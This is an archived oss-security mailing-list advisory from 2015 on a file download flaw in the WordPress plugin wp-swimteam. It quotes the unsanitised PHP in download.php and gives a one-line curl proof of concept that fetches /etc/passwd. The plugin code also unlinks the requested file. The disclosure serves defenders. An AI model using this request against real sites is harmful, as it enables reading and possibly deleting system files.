X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1856" "Wednesday" "8" "July" "2015" "06:52:35" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<61244B9F-F7C6-40EE-BCB1-66B8ABBF21E8@me.com>" "48" "[oss-security] Remote file download vulnerability in Wordpress Plugin wp-swimteam v1.44.10777" nil nil nil "7" "2015070810:52:35" "[oss-security] Remote file download vulnerability in Wordpress Plugin wp-swimteam v1.44.10777" (number mark "U       larry0@me.co Jul  8   48/1856  " thread-indent "\"[oss-security] Remote file download vulnerability in Wordpress Plugin wp-swimteam v1.44.10777\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 13661 invoked by uid 550); 8 Jul 2015 10:53:01 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 13578 invoked from network); 8 Jul 2015 10:52:54 -0000
X-Proofpoint-Virus-Version: vendor=fsecure
 engine=2.50.10432:5.14.151,1.0.33,0.0.0000
 definitions=2015-07-08_05:2015-07-07,2015-07-08,1970-01-01 signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
 suspectscore=0 phishscore=0 adultscore=0 bulkscore=0 classifier=spam adjust=0
 reason=mlx scancount=1 engine=7.0.1-1412110000 definitions=main-1507080181
From: "Larry W. Cashdollar" <larry0@me.com>
Content-type: text/plain; charset=utf-8
Content-transfer-encoding: quoted-printable
Date: Wed, 08 Jul 2015 06:52:35 -0400
Message-id: <61244B9F-F7C6-40EE-BCB1-66B8ABBF21E8@me.com>
Cc: fulldisclosure@seclists.org
To: Open Source Security <oss-security@lists.openwall.com>
MIME-version: 1.0 (Mac OS X Mail 8.2 \(2098\))
X-Mailer: Apple Mail (2.2098)
Subject: [oss-security] Remote file download vulnerability in Wordpress Plugin wp-swimteam
 v1.44.10777

Title: Remote file download vulnerability in Wordpress Plugin wp-swimteam v=
1.44.10777
Author: Larry W. Cashdollar, @_larry0
Date: 2015-07-02
Download Site: https://wordpress.org/plugins/wp-swimteam
Vendor: Mike Walsh www.MichaelWalsh.org
Vendor Notified: 2015-07-02, fixed in v1.45beta3
Vendor Contact: Through website
Advisory: http://www.vapid.dhs.org/advisory.php?v=3D134
Description: Swim Team (aka wp-SwimTeam) is a comprehensive WordPress plugi=
n to run a swim team including registration, volunteer assignments, schedul=
ing, and much more.
Vulnerability:
The code in ./wp-swimteam/include/user/download.php doesn't sanitize user i=
nput from downloading sensitive system files:


 50             $file =3D urldecode($args['file']) ;
 51             $fh =3D fopen($file, 'r') or die('Unable to load file, some=
thing bad has happened.') ;
 52=20
 53             while (!feof($fh))
 54                 $txt .=3D fread($fh, 1024) ;
 55=20
 56             //  Clean up the temporary file - permissions
 57             //  may prevent this from succeedeing so use the '@'
 58             //  to suppress any messages from PHP.
 59=20
 60             @unlink($file) ;
 61         }
 62=20
 63         $filename =3D urldecode($args['filename']) ;
 64         $contenttype =3D urldecode($args['contenttype']) ;
 65=20
 66         // Tell browser to expect a text file of some sort (usually txt=
 or csv)
 67=20
 68         header(sprintf('Content-Type: application/%s', $contenttype)) ;
 69         header(sprintf('Content-disposition:  attachment; filename=3D%s=
', $filename)) ;
 70         print $txt ;

CVEID:
OSVDB:
Exploit Code:
	=E2=80=A2 $ curl "http://www.vapidlabs.com/wp-content/plugins/wp-swimteam/=
include/user/download.php?file=3D/etc/passwd&filename=3D/etc/passwd&content=
type=3Dtext/html&transient=3D1&abspath=3D/usr/share/wordpress"=
